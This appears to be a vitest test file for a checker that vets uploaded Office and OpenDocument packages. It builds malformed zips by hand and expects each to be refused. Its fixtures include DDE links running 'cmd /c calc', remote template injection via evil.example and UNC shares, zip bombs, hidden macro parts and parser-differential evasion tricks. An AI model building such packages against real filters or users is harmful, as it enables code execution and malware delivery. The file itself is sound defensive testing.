import { describe, expect, it } from "vitest";
import { crc32, inspect } from "../src/kinds";

// Zip files built by hand, the ways a package can be made to read one way for a check and another for Office: lying sizes, a
// second end record, duplicate names, bombs. Every one of these has to be refused, and quickly.
const BS = String.fromCharCode(92);
const LONGS = String.fromCharCode(0x17f);
const enc = (s: string) => new TextEncoder().encode(s);
const u16 = (n: number) => [n & 255, (n >> 8) & 255];
const u32 = (n: number) => [n & 255, (n >> 8) & 255, (n >> 16) & 255, (n >>> 24) & 255];

type Part = { name: string; body: Uint8Array | string; deflate?: boolean; raw?: Uint8Array; cPacked?: number; cSize?: number; cMethod?: number; lMethod?: number; lName?: string; shareWith?: number; flags?: number; crc?: number };

async function deflate(b: Uint8Array) {
  return new Uint8Array(await new Response(new Blob([b]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
}

function cat(chunks: (Uint8Array | number[])[]) {
  const out = new Uint8Array(chunks.reduce((n, c) => n + c.length, 0));
  let at = 0;
  for (const c of chunks) {
    out.set(c, at);
    at += c.length;
  }
  return out;
}

async function build(parts: Part[], startAt = 0) {
  const local: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  const offsets: number[] = [];
  let pos = startAt;
  for (const p of parts) {
    const plain = typeof p.body === "string" ? enc(p.body) : p.body;
    const method = p.deflate ? 8 : 0;
    const data = p.raw ?? (method === 8 ? await deflate(plain) : plain);
    const n = enc(p.name);
    let at = pos;
    if (p.shareWith !== undefined) {
      at = offsets[p.shareWith];
    } else {
      const ln = enc(p.lName ?? p.name);
      const lh = cat([u32(0x04034b50), u16(20), u16(p.flags ?? 0), u16(p.lMethod ?? method), u32(0), u32(p.crc ?? crc32(plain)), u32(data.length), u32(plain.length), u16(ln.length), u16(0), ln, data]);
      local.push(lh);
      pos += lh.length;
    }
    offsets.push(at);
    central.push(cat([u32(0x02014b50), u16(20), u16(20), u16(p.flags ?? 0), u16(p.cMethod ?? method), u32(0), u32(p.crc ?? crc32(plain)), u32(p.cPacked ?? data.length), u32(p.cSize ?? plain.length), u16(n.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(at), n]));
  }
  return { local: cat(local), central: cat(central), count: parts.length };
}

const eocd = (count: number, cdSize: number, cdAt: number, comment: Uint8Array = new Uint8Array(), diskCount = count) =>
  cat([u32(0x06054b50), u16(0), u16(0), u16(diskCount), u16(count), u32(cdSize), u32(cdAt), u16(comment.length), comment]);

async function zip(parts: Part[]) {
  const z = await build(parts);
  return cat([z.local, z.central, eocd(z.count, z.central.length, z.local.length)]);
}

const OFFICE = "application/vnd.openxmlformats-officedocument";
const types = (...ov: string[]) => `<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/>${ov.join("")}</Types>`;
const ov = (part: string, ct: string) => `<Override PartName="${part}" ContentType="${ct}"/>`;
const rels = (...r: string[]) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${r.join("")}</Relationships>`;
const rel = (id: string, type: string, target: string, ext = false) => `<Relationship Id="${id}" Type="${type}" Target="${target}"${ext ? ' TargetMode="External"' : ""}/>`;
const OLE = new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...new Array(600).fill(0)]);
const DOCX_CT = ov("/word/document.xml", `${OFFICE}.wordprocessingml.document.main+xml`);
const XLSX_CT = ov("/xl/workbook.xml", `${OFFICE}.spreadsheetml.sheet.main+xml`);
const DOCM = "application/vnd.ms-word.document.macroEnabled.main+xml";
const ATTACHED = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate";
const run = (b: Uint8Array, name = "x.docx") => inspect("zip", b, name);
const docx = (...extra: Part[]) => zip([{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }, ...extra]);

const refused = (r: string | null) => expect([null, "macros", "chunk"]).toContain(r);
const accepted = (r: string | null) => expect(r).toMatch(/^application\//);

async function bomb(mb: number) {
  const zeros = new Uint8Array(1 << 20);
  const s = new ReadableStream({
    start(c) {
      for (let i = 0; i < mb; i++) c.enqueue(zeros);
      c.close();
    },
  });
  return new Uint8Array(await new Response(s.pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
}

async function timed(fn: () => Promise<string | null>, limit: number) {
  const t = Date.now();
  const r = await fn();
  expect(Date.now() - t).toBeLessThan(limit);
  return r;
}

describe("sizes and offsets that disagree", () => {
  it("refuses a stored part whose central packed size is 0, which hides the part", async () => {
    refused(await run(await docx({ name: "word/media/image1.png", body: OLE, cPacked: 0 })));
  });

  it("refuses content types cut short by a central size, so Word would read more than the check did", async () => {
    const ct = types(DOCX_CT) + ov("/word/document.xml", DOCM);
    refused(await run(await zip([{ name: "[Content_Types].xml", body: ct, cPacked: types(DOCX_CT).length }, { name: "word/document.xml", body: "<d/>" }])));
  });

  it("refuses a local header that names another part, or another method than the central one", async () => {
    refused(await run(await docx({ name: "word/media/x.xml", lName: "word/vbaProject.bin", body: "<x/>" })));
    refused(await run(await docx({ name: "word/media/image1.png", body: OLE, raw: await deflate(OLE), cMethod: 0, lMethod: 8 })));
  });

  it("refuses a second end record hidden in the comment, and a count that differs from the disk's", async () => {
    const good = await build([{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }]);
    const bad = await build(
      [{ name: "[Content_Types].xml", body: types(ov("/word/document.xml", DOCM)) }, { name: "word/document.xml", body: "<d/>" }, { name: "word/vbaProject.bin", body: OLE }],
      good.local.length,
    );
    const goodAt = good.local.length + bad.local.length;
    const real = eocd(bad.count, bad.central.length, goodAt + good.central.length, eocd(good.count, good.central.length, goodAt));
    refused(await run(cat([good.local, bad.local, good.central, bad.central, real])));
    const z = await build([{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }, { name: "word/media/image1.png", body: OLE }]);
    refused(await run(cat([z.local, z.central, eocd(2, z.central.length, z.local.length, new Uint8Array(), 3)])));
  });

  it("refuses entries that share or overlap their bytes", async () => {
    refused(await run(await docx({ name: "word/a.bin", body: "x" }, { name: "word/b.bin", body: "x", shareWith: 2 })));
  });

  it("refuses names that two readers could take differently", async () => {
    for (const name of ["word/../x.xml", "/word/x.xml", `word${BS}x.xml`, "word/./x.xml", "word/a%2Fb.xml", "word//x.xml", "word/x\0.xml"]) {
      refused(await run(await docx({ name, body: "<x/>" })));
    }
    refused(await run(await docx({ name: "word/Media.bin", body: "x" }, { name: "WORD/media.BIN", body: "y" })));
    refused(await run(await zip([{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }, { name: "[CONTENT_TYPES].XML", body: types(ov("/word/media/ax.xml", "application/vnd.ms-office.activeX+xml")) }])));
  });

  it("refuses a package with a flag for encryption", async () => {
    refused(await run(await docx({ name: "word/e.bin", body: "x", flags: 1 })));
  });
});

describe("a package that claims to be two formats", () => {
  it("is refused, and so is a macro sheet hidden behind an OpenDocument label", async () => {
    const b = await zip([
      { name: "mimetype", body: "application/vnd.oasis.opendocument.spreadsheet" },
      { name: "content.xml", body: "<c/>" },
      { name: "[Content_Types].xml", body: types(XLSX_CT, ov("/xl/macrosheets/sheet1.xml", "application/vnd.ms-excel.macrosheet+xml")) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/macrosheets/sheet1.xml", body: "<xm:macrosheet/>" },
    ]);
    refused(await run(b, "a.ods"));
  });

  it("takes an OpenDocument file whose mimetype is deflated or not first, and refuses its macros in any case or path", async () => {
    accepted(await run(await zip([{ name: "mimetype", body: "application/vnd.oasis.opendocument.text", deflate: true }, { name: "content.xml", body: "<c/>" }]), "a.odt"));
    accepted(await run(await zip([{ name: "content.xml", body: "<c/>" }, { name: "mimetype", body: "application/vnd.oasis.opendocument.text" }]), "a.odt"));
    for (const dir of ["basic/Standard/Module1.xml", "Basic/Standard/Module1.xml", "Object 1/Basic/Standard/Module1.xml", "SCRIPTS/x.py", "Dialogs/d.xml"]) {
      refused(await run(await zip([{ name: "mimetype", body: "application/vnd.oasis.opendocument.text" }, { name: "content.xml", body: "<c/>" }, { name: dir, body: "x" }]), "a.odt"));
    }
    for (const dir of ["./Basic/Standard/Module1.xml", `Basic${BS}Standard${BS}Module1.xml`, "/Basic/Standard/Module1.xml"]) {
      refused(await run(await zip([{ name: "mimetype", body: "application/vnd.oasis.opendocument.text" }, { name: "content.xml", body: "<c/>" }, { name: dir, body: "x" }]), "a.odt"));
    }
  });
});

describe("macros by reference", () => {
  it("refuses a template, sub-document or frame fetched from elsewhere, and takes one on this computer", async () => {
    const fetched = async (type: string, target: string) =>
      run(await docx({ name: "word/_rels/settings.xml.rels", body: rels(rel("rId1", `http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}`, target, true)) }));
    for (const [type, target] of [
      ["attachedTemplate", "https://evil.example/t.dotm"],
      ["attachedTemplate", "ftp://evil.example/t.dotm"],
      ["subDocument", `${BS}${BS}evil${BS}share${BS}x.docx`],
      ["frame", "//evil/share/x.docx"],
      ["attachedTemplate", "file://evil/share/t.dotm"],
    ]) refused(await fetched(type, target));
    accepted(await fetched("attachedTemplate", "file:///C:/Templates/Normal.dotm"));
    accepted(await fetched("attachedTemplate", "Normal.dotm"));
  });

  it("refuses included chunks and DDE links", async () => {
    expect(await run(await docx({ name: "word/aFChunk1.mht", body: "x" }))).toBe("chunk");
    expect(await run(await docx({ name: "word/_rels/document.xml.rels", body: rels(rel("rId1", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk", "x.mht")) }))).toBe("chunk");
    const dde = await zip([
      { name: "[Content_Types].xml", body: types(XLSX_CT) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/externalLinks/externalLink1.xml", body: '<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>' },
    ]);
    refused(await run(dde, "x.xlsx"));
  });
});

describe("text that reads differently to a checker and to Office", () => {
  it("refuses UTF-32, an encoding declaration that is not UTF, a document type, and a null", async () => {
    const s = types(ov("/word/document.xml", DOCM));
    const utf32 = new Uint8Array([0xff, 0xfe, 0, 0, ...[...s].flatMap((c) => [c.charCodeAt(0), 0, 0, 0])]);
    const withTypes = (body: Uint8Array | string) => zip([{ name: "[Content_Types].xml", body }, { name: "word/document.xml", body: "<d/>" }]);
    refused(await run(await withTypes(utf32)));
    refused(await run(await withTypes('<?xml version="1.0" encoding="UTF-7"?>' + types(ov("/word/document.xml", "application/vnd.ms-word.document.+AG0-acroEnabled.main+xml")))));
    refused(await run(await withTypes("<!DOCTYPE x [<!ENTITY a 'macro'>]>" + types(DOCX_CT))));
    refused(await run(await withTypes(types(DOCX_CT) + "\0")));
  });

  it("folds look-alike letters before it looks", async () => {
    const b = await zip([
      { name: "[Content_Types].xml", body: types(XLSX_CT, ov("/xl/worksheets/sheet2.xml", `application/vnd.ms-excel.macro${LONGS}heet+xml`)) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/worksheets/sheet2.xml", body: "<m/>" },
    ]);
    refused(await run(b, "x.xlsx"));
  });
});

describe("a bomb is stopped, not unpacked", () => {
  it("stops one that is declared small and inflates to 1.5 GB, in the content types or any part", async () => {
    const raw = await bomb(1536);
    refused(await timed(async () => run(await zip2(raw)), 5000));
    async function zip2(r: Uint8Array) {
      return zip([{ name: "[Content_Types].xml", body: "x", raw: r, deflate: true }, { name: "word/document.xml", body: "<d/>" }]);
    }
    const b = await docx({ name: "word/media/z.bin", body: new Uint8Array(1), raw, deflate: true });
    refused(await timed(() => run(b), 5000));
  }, 120_000);

  it("stops thousands of entries that all point at one bomb", async () => {
    const raw = await bomb(512);
    const parts: Part[] = [{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }, { name: "word/media/z0.bin", body: new Uint8Array(1), raw, deflate: true }];
    for (let i = 1; i < 2998; i++) parts.push({ name: `word/media/z${i}.bin`, body: new Uint8Array(1), raw, deflate: true, shareWith: 2 });
    refused(await timed(async () => run(await zip(parts)), 5000));
  }, 120_000);

  it("stops packages nested to multiply the work, and counts every level's parts together", async () => {
    const tiny = await deflate(enc("x"));
    const inner: Part[] = [{ name: "[Content_Types].xml", body: types(XLSX_CT) }, { name: "xl/workbook.xml", body: "<w/>" }, { name: "a0", body: "x", raw: tiny, deflate: true }];
    for (let i = 1; i < 2000; i++) inner.push({ name: `a${i}`, body: "x", raw: tiny, deflate: true });
    const B = await zip(inner);
    const mid: Part[] = [{ name: "[Content_Types].xml", body: types(XLSX_CT) }, { name: "xl/workbook.xml", body: "<w/>" }];
    for (let i = 0; i < 3; i++) mid.push({ name: `b${i}.xlsx`, body: B, deflate: true });
    const A = await zip(mid);
    refused(await timed(async () => run(await docx({ name: "word/embeddings/a.xlsx", body: A, deflate: true })), 10_000));
  }, 120_000);

  it("stops a part that starts like a package and then inflates to more than it said", async () => {
    const lie = cat([[0x50, 0x4b, 3, 4], new Array(1 << 20).fill(0)]);
    refused(await timed(async () => run(await docx({ name: "word/embeddings/a.xlsx", body: lie, deflate: true, cSize: 100 })), 5000));
  }, 60_000);
});

describe("real files that must still pass", () => {
  it("takes a presentation of 125 slides, with 250 relationship parts", async () => {
    const parts: Part[] = [{ name: "[Content_Types].xml", body: types(ov("/ppt/presentation.xml", `${OFFICE}.presentationml.presentation.main+xml`)) }, { name: "ppt/presentation.xml", body: "<p/>" }];
    for (let i = 1; i <= 125; i++) {
      parts.push({ name: `ppt/slides/slide${i}.xml`, body: "<s/>", deflate: true });
      parts.push({ name: `ppt/slides/_rels/slide${i}.xml.rels`, body: rels(rel("r1", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout", "../slideLayouts/slideLayout1.xml")), deflate: true });
      parts.push({ name: `ppt/notesSlides/notesSlide${i}.xml`, body: "<n/>", deflate: true });
      parts.push({ name: `ppt/notesSlides/_rels/notesSlide${i}.xml.rels`, body: rels(rel("r1", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide", "../slides/slide1.xml")), deflate: true });
    }
    accepted(await run(await zip(parts), "deck.pptx"));
  });

  it("takes two chart workbooks of 9 MB each in one document", async () => {
    const rnd = new Uint8Array(9 << 20);
    for (let i = 0; i < rnd.length; i += 65536) crypto.getRandomValues(rnd.subarray(i, i + 65536));
    const book = await zip([{ name: "[Content_Types].xml", body: types(XLSX_CT) }, { name: "xl/workbook.xml", body: "<w/>" }, { name: "xl/media/image1.jpeg", body: rnd }]);
    accepted(await run(await docx({ name: "word/embeddings/a.xlsx", body: book }, { name: "word/embeddings/b.xlsx", body: book })));
  }, 120_000);

  it("takes embedded packages that are not Word, Excel or PowerPoint, and checks what is inside them", async () => {
    const vsdx = await zip([{ name: "[Content_Types].xml", body: types(ov("/visio/document.xml", "application/vnd.ms-visio.drawing.main+xml")) }, { name: "visio/document.xml", body: "<v/>" }]);
    const plain = await zip([{ name: "notes.txt", body: "hello" }]);
    accepted(await run(await docx({ name: "word/embeddings/d.vsdx", body: vsdx }, { name: "word/embeddings/n.zip", body: plain })));
    const plainWithOle = await zip([{ name: "tool.dat", body: OLE }]);
    refused(await run(await docx({ name: "word/embeddings/n.zip", body: plainWithOle })));
  });
});

const TPL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate";
const tplDoc = (relsXml: string) =>
  docx({ name: "word/settings.xml", body: "<w:settings/>" }, { name: "word/_rels/settings.xml.rels", body: relsXml });

describe("relationships read one attribute at a time", () => {
  it("is not fooled by a > inside a value, or by an attribute name inside another value", async () => {
    refused(await run(await tplDoc(rels(`<Relationship Id="rId1" Target="https://evil.example/t.dotm?a=>" Type="${TPL}" TargetMode="External"/>`))));
    refused(await run(await tplDoc(rels(`<Relationship Id="a Target='C:/t.dotx'" Type="${TPL}" Target="https://evil.example/t.dotm" TargetMode="External"/>`))));
    refused(await run(await tplDoc(rels(`<Relationship Id="a Type='x'" Target="https://evil.example/t.dotm" Type="${TPL}" TargetMode="External"/>`))));
    refused(await run(await tplDoc(rels(`<Relationship Id="1" Type="${TPL}" Target="https&#58;//evil.example/t.dotm" TargetMode="External"/>`))));
  });

  it("takes only a path inside the package or on this computer as local", async () => {
    const fetched = async (t: string) => run(await tplDoc(rels(rel("rId1", TPL, t, true))));
    for (const t of ["file:////evil/share/t.dotm", `file:///${BS}${BS}evil${BS}share${BS}t.dotm`, `/${BS}evil${BS}share${BS}t.dotm`, `${BS}/evil/share/t.dotm`, "mhtml:https://evil.example/x", "//evil/x", "ftp://evil/x"]) {
      refused(await fetched(t));
    }
    for (const t of ["C:/Users/a/Templates/t.dotx", "file:///C:/Users/a/t.dotx", "Normal.dotm", "../templates/Normal.dotm"]) accepted(await fetched(t));
  });

  it("looks at types and relationship types, not at targets: a link that only mentions activex is fine", async () => {
    accepted(await run(await docx({ name: "word/_rels/document.xml.rels", body: rels(rel("rId5", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink", "https://learn.microsoft.com/en-us/office/activex-controls-oleobject", true)) })));
  });

  it("gives included chunks their own answer", async () => {
    expect(await run(await docx({ name: "word/_rels/document.xml.rels", body: rels(rel("r1", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk", "x.mht")) }))).toBe("chunk");
  });
});

describe("parts that are named one thing and are another", () => {
  it("finds an external link by what the types and relationships say, wherever the part sits", async () => {
    const b = await zip([
      { name: "[Content_Types].xml", body: types(XLSX_CT, ov("/xl/media/e.xml", `${OFFICE}.spreadsheetml.externalLink+xml`)) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/_rels/workbook.xml.rels", body: rels(rel("r9", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink", "media/e.xml")) },
      { name: "xl/media/e.xml", body: '<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>' },
    ]);
    refused(await run(b, "a.xlsx"));
  });

  it("takes a workbook with a large external link cache, since only the start of the part is read", async () => {
    const rows = Array.from({ length: 60000 }, (_, i) => `<row r="${i + 1}"><cell r="A${i + 1}"><v>${i}</v></cell></row>`).join("");
    const b = await zip([
      { name: "[Content_Types].xml", body: types(XLSX_CT) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/externalLinks/externalLink1.xml", body: `<externalLink><externalBook r:id="rId1"><sheetDataSet><sheetData sheetId="0">${rows}</sheetData></sheetDataSet></externalBook></externalLink>`, deflate: true },
    ]);
    accepted(await run(b, "a.xlsx"));
  });

  it("reads a part that declares fewer than 8 bytes in full, so the declaration can't hide what is in it", async () => {
    for (const size of [0, 3, 5, 7]) refused(await run(await docx({ name: "word/media/image1.png", body: OLE, deflate: true, cSize: size })));
    const inner = await zip([{ name: "[Content_Types].xml", body: types(ov("/xl/workbook.xml", "application/vnd.ms-excel.sheet.macroEnabled.main+xml")) }, { name: "xl/workbook.xml", body: "<w/>" }]);
    refused(await run(await docx({ name: "word/embeddings/x.xlsm", body: inner, deflate: true, cSize: 3 })));
  });

  it("finds the content types of an embedded package whatever the case of its name", async () => {
    const inner = await zip([{ name: "[content_types].xml", body: types(XLSX_CT, ov("/xl/media/a.xml", "application/vnd.ms-office.activeX+xml")) }, { name: "xl/workbook.xml", body: "<w/>" }, { name: "xl/media/a.xml", body: "<ax:ocx/>" }]);
    refused(await run(await docx({ name: "word/embeddings/x.xlsx", body: inner, deflate: true })));
  });
});

describe("a zip with nothing in it that the directory does not name", () => {
  it("is refused when an entry hides in a gap, before the first entry or after the last", async () => {
    const hidden = cat([u32(0x04034b50), u16(20), u16(0), u16(0), u32(0), u32(crc32(OLE)), u32(OLE.length), u32(OLE.length), u16(19), u16(0), enc("word/vbaProject.bin"), OLE]);
    const z = await build([{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }], hidden.length);
    refused(await run(cat([hidden, z.local, z.central, eocd(z.count, z.central.length, hidden.length + z.local.length)])));
    const y = await build([{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }]);
    refused(await run(cat([y.local, hidden, y.central, eocd(y.count, y.central.length, y.local.length + hidden.length)])));
  });

  it("is refused when a directory entry carries data", async () => {
    refused(await run(await docx({ name: "xl/vbaProject.bin/", body: OLE })));
  });

  it("is refused when a part's checksum is wrong", async () => {
    refused(await run(await zip([{ name: "[Content_Types].xml", body: types(DOCX_CT), crc: 12345 }, { name: "word/document.xml", body: "<d/>" }])));
  });
});

describe("size limits that real files meet", () => {
  it("takes one embedded workbook of 13 MB", async () => {
    const rnd = new Uint8Array(13 << 20);
    for (let i = 0; i < rnd.length; i += 65536) crypto.getRandomValues(rnd.subarray(i, i + 65536));
    const book = await zip([{ name: "[Content_Types].xml", body: types(XLSX_CT) }, { name: "xl/workbook.xml", body: "<w/>" }, { name: "xl/media/image1.jpeg", body: rnd }]);
    accepted(await run(await docx({ name: "word/embeddings/Microsoft_Excel_Worksheet1.xlsx", body: book })));
  }, 120_000);

  it("stops 2,990 distinct bombs, each declared small, within a few seconds", async () => {
    const raw = await deflate(new Uint8Array(8 << 20));
    const parts: Part[] = [{ name: "[Content_Types].xml", body: types(DOCX_CT) }, { name: "word/document.xml", body: "<d/>" }];
    for (let i = 0; i < 2990; i++) parts.push({ name: `word/media/z${i}.bin`, body: new Uint8Array(1), raw, deflate: true, cSize: 8 << 20 });
    const b = await zip(parts);
    await timed(() => run(b), 20_000);
  }, 120_000);
});

describe("markup that hides a tag from the reader", () => {
  const MS = "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet";
  const RNS = "http://schemas.openxmlformats.org/package/2006/relationships";
  const swallow = (tag: string, inner: string) => `<!-- <${tag} a="--><${inner}/><!--"/> -->`;
  const book = (extra: Part[]) => zip([{ name: "xl/workbook.xml", body: "<w/>" }, ...extra]);
  const linkBook = (name: string, body: string, target: string) =>
    zip([
      { name: "[Content_Types].xml", body: types(XLSX_CT) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/_rels/workbook.xml.rels", body: rels(rel("r9", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink", target)) },
      { name, body },
    ]);
  const DDE = '<ddeLink ddeService="cmd" ddeTopic="/c calc"/>';

  it("refuses a comment that swallows the real relationship or override", async () => {
    refused(await run(await tplDoc(rels(swallow("Relationship", `Relationship Id='rId1' Type='${TPL}' Target='https://evil.example/t.dotm' TargetMode='External'`)))));
    const ct = types(XLSX_CT, swallow("Override", "Override PartName='/xl/worksheets/sheet2.xml' ContentType='application/vnd.ms-excel.macrosheet+xml'"));
    refused(await run(await book([{ name: "[Content_Types].xml", body: ct }, { name: "xl/worksheets/sheet2.xml", body: "<xm:macrosheet/>" }]), "a.xlsx"));
  });

  it("refuses CDATA, entity declarations and other processing instructions, and takes the xml declaration", async () => {
    for (const x of ["<![CDATA[ <Relationship/> ]]>", "<!ENTITY a 'b'>", "<?php x ?>"]) {
      refused(await run(await tplDoc(`<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${x}</Relationships>`)));
    }
    accepted(await run(await tplDoc(rels(rel("rId1", TPL, "Normal.dotm", true)))));
  });

  it("finds elements under any prefix, however it is spelled", async () => {
    const x = `<?xml version="1.0"?><Relationships xmlns="${RNS}" xmlns:\u00e9="${RNS}"><\u00e9:Relationship Id="rId1" Type="${TPL}" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`;
    refused(await run(await tplDoc(x)));
    refused(await run(await linkBook("xl/media/e.xml", `<\u00e9:externalLink xmlns:\u00e9="x"><\u00e9:ddeLink ddeService="cmd" ddeTopic="/c calc"/></\u00e9:externalLink>`, "media/e.xml"), "a.xlsx"));
  });

  it("takes an external link part only if its first child is an external book", async () => {
    const pad = " ".repeat(10000);
    refused(await run(await linkBook("xl/externalLinks/externalLink1.xml", `<externalLink>${pad}${DDE}</externalLink>`, "externalLinks/externalLink1.xml"), "a.xlsx"));
    refused(await run(await linkBook("xl/externalLinks/externalLink1.xml", `<externalLink a="${"x".repeat(10000)}">${DDE}</externalLink>`, "externalLinks/externalLink1.xml"), "a.xlsx"));
    refused(await run(await linkBook("xl/externalLinks/externalLink1.xml", "<externalLink><somethingElse/></externalLink>", "externalLinks/externalLink1.xml"), "a.xlsx"));
    accepted(await run(await linkBook("xl/externalLinks/externalLink1.xml", '<externalLink><externalBook r:id="rId1"/></externalLink>', "externalLinks/externalLink1.xml"), "a.xlsx"));
  });

  it("resolves an external link's target the way Office does, and refuses one that names no part", async () => {
    refused(await run(await linkBook("xl/media/e.xml", `<externalLink>${DDE}</externalLink>`, `media${BS}e.xml`), "a.xlsx"));
    refused(await run(await linkBook("xl/media/e.xml", `<externalLink>${DDE}</externalLink>`, "media%2Fe.xml"), "a.xlsx"));
    refused(await run(await linkBook("xl/media/e.xml", "<externalLink><externalBook/></externalLink>", "media/missing.xml"), "a.xlsx"));
  });

  it("looks at every percent-decoded form of a target, and at invisible characters", async () => {
    const fetched = async (t: string) => run(await tplDoc(rels(rel("rId1", TPL, t, true))));
    for (const t of ["%5C%5Cevil%5Cshare%5Ct.dotm", "%2F%2Fevil/share/t.dotm", "%255C%255Cevil%255Cs%255Ct.dotm", "\u200b" + BS + BS + "evil" + BS + "share" + BS + "t.dotm", "file:///C:/../" + BS + BS + "evil" + BS + "s" + BS + "t.dotm", "Normal\u200b.dotm"]) {
      refused(await fetched(t));
    }
    accepted(await fetched("My%20Templates/Normal.dotm"));
  });
});

describe("one strict reader for the small xml parts", () => {
  const XNS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
  const EXT = `${XNS}/externalLink`;
  const EXTPATH = `${XNS}/externalLinkPath`;
  const RNS = "http://schemas.openxmlformats.org/package/2006/relationships";
  const XL_EXT_CT = ov("/xl/externalLinks/externalLink1.xml", `${OFFICE}.spreadsheetml.externalLink+xml`);
  const linkXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><externalBook xmlns:r="${XNS}" r:id="rId1"/></externalLink>`;

  it("takes a workbook linked to another one the way Excel saves it, with the link's own relationships", async () => {
    const withRels = await zip([
      { name: "[Content_Types].xml", body: types(XLSX_CT, XL_EXT_CT) },
      { name: "xl/workbook.xml", body: "<w/>" },
      { name: "xl/_rels/workbook.xml.rels", body: rels(rel("rId4", EXT, "externalLinks/externalLink1.xml")) },
      { name: "xl/externalLinks/externalLink1.xml", body: linkXml },
      { name: "xl/externalLinks/_rels/externalLink1.xml.rels", body: rels(rel("rId1", EXTPATH, `file:///C:${BS}Users${BS}a${BS}Book2.xlsx`, true)) },
    ]);
    accepted(await run(withRels, "a.xlsx"));
  });

  it("is not fooled by an attribute spelled in another case, or by a processing instruction that starts like the declaration", async () => {
    refused(await run(await tplDoc(`<?xml version="1.0"?><Relationships xmlns="${RNS}"><Relationship Id="rId1" Type="${TPL}" target="Normal.dotm" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`)));
    refused(await run(await tplDoc(`<?xml version="1.0"?><Relationships xmlns="${RNS}"><Relationship Id="rId1" type="urn:x" Type="${TPL}" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`)));
    refused(await run(await tplDoc(`<?xml-stylesheet <Relationship a='?><Relationships xmlns="${RNS}"><Relationship Id="rId1" Type="${TPL}" Target="https://evil.example/t.dotm" TargetMode="External"/><Relationship Id="rZ" Type="urn:x" Target="y'/>"/></Relationships>`)));
    refused(await run(await tplDoc(rels(rel("rId1", TPL, "https://evil.example/t.dotm", true)))));
  });

  it("refuses anything that is not plain elements with quoted attributes", async () => {
    const wrap = (inner: string, head = '<?xml version="1.0"?>') => `${head}<Relationships xmlns="${RNS}">${inner}</Relationships>`;
    const ok = rel("rId1", TPL, "Normal.dotm");
    accepted(await run(await tplDoc(wrap(ok))));
    accepted(await run(await tplDoc(wrap(`\n  ${ok}\r\n`))));
    for (const bad of [
      wrap(`<!-- x -->${ok}`),
      wrap(`<?pi x?>${ok}`),
      wrap(`<![CDATA[x]]>${ok}`),
      wrap(`text${ok}`),
      wrap(`${ok} & more`),
      wrap(`<Relationship Id="a" Id="b" Type="x" Target="y"/>`),
      wrap(`<Relationship Id=a Type="x" Target="y"/>`),
      wrap(`<Relationship Id="a&bogus;" Type="x" Target="y"/>`),
      wrap(`<Relationship Id="a" Type="x" Target="y"></Other>`),
      wrap(`<Relationship Id="a" Type="x" Target="y"/`),
      wrap(`<Relationship Id="a"Type="x" Target="y"/>`),
      wrap(ok, " <?xml version=\"1.0\"?>"),
      wrap(ok, "<!DOCTYPE x>"),
      wrap(`<Relationship Id="a" Type="x" Target="y"><Relationship Id="b" Type="x" Target="z"/></Relationship>`),
      `<Other xmlns="${RNS}">${ok}</Other>`,
    ]) refused(await run(await tplDoc(bad)));
  });

  it("reads the five predefined entities and numeric references in a value", async () => {
    accepted(await run(await tplDoc(rels(rel("rId1", TPL, "Normal&amp;1&#46;dotm", true)))));
    refused(await run(await tplDoc(rels(rel("rId1", TPL, "https&#x3a;//evil.example/t.dotm", true)))));
  });

  it("takes the first child of an external link from its start tag alone, with the rest of the part not read", async () => {
    const link = (body: string) =>
      zip([
        { name: "[Content_Types].xml", body: types(XLSX_CT, XL_EXT_CT) },
        { name: "xl/workbook.xml", body: "<w/>" },
        { name: "xl/_rels/workbook.xml.rels", body: rels(rel("rId4", EXT, "externalLinks/externalLink1.xml")) },
        { name: "xl/externalLinks/externalLink1.xml", body },
      ]);
    accepted(await run(await link(linkXml + " ".repeat(20000)), "a.xlsx"));
